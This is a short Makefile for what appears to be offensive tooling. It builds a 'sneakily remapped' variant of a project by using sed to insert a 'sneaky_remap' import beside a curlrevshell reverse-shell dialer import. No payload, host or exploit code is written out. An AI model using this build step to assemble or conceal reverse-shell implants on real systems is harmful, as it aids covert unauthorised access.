# Makefile
# Build horizontal_aubergine_sneakily_remapped
# By J. Stuart McMurray
# Created 20251031
# Last Modified 20251102

ORIG=../horizontal_aubergine

.include "${ORIG}/Makefile"

init.c: ${ORIG}/init.c
	cp $> $@

${WD}.go: ${ORIG}/${ORIG:T}.go
	sed '\
		/"github.com\/magisterquis\/curlrevshell\/lib\/crsdialer"/a\
		_ "github.com/magisterquis/sneaky_remap"\
	' ${>:M*.go} >$@
	go fmt $@

clean::
	rm -f *.go *.c
	go mod tidy

.PHONY: clean
